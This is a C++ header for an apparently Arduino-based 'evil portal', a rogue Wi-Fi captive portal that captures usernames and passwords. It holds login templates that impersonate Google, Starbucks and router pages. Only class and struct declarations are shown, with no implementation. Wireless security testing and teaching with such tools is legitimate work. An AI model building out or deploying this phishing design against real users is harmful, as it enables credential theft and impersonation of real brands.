/*
 * ============================================================
 *  GhostNet — evil_portal.h
 *  Captive portal with credential capture
 * ============================================================
 */

#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>
#include "config.h"

// ── Data Structures ────────────────────────────────────────
struct CapturedCred {
  char username[64];
  char password[64];
  char timestamp[12];     // "HH:MM:SS"
  char templateName[16];
};

// ── EvilPortal Class ───────────────────────────────────────
class EvilPortal {
public:
  EvilPortal();

  void start(const char* ssid);
  void stop();
  void handleClient();          // Call in loop

  bool          isRunning() const;
  int           getClientCount() const;
  int           getCredCount() const;
  CapturedCred* getCred(int index);
  CapturedCred* getCreds();
  const char*   getSSID() const;

  // ── Template Selection (Bruce Feature) ──
  void          setTemplate(PortalTemplate t);
  PortalTemplate getTemplate() const;
  static const char* getTemplateName(PortalTemplate t);

private:
  bool           _running;
  char           _ssid[33];
  int            _clientCount;
  CapturedCred   _creds[MAX_CREDENTIALS];
  int            _credCount;
  PortalTemplate _selectedTemplate;

  void _setupDNS();
  void _setupWebServer();
  void _handleRoot();
  void _handleSubmit();
  void _handleNotFound();

  // HTML templates stored in PROGMEM
  static const char PORTAL_HTML_GENERIC[];
  static const char PORTAL_HTML_GOOGLE[];
  static const char PORTAL_HTML_ROUTER[];
  static const char PORTAL_HTML_STARBUCKS[];
};

#endif // EVIL_PORTAL_H
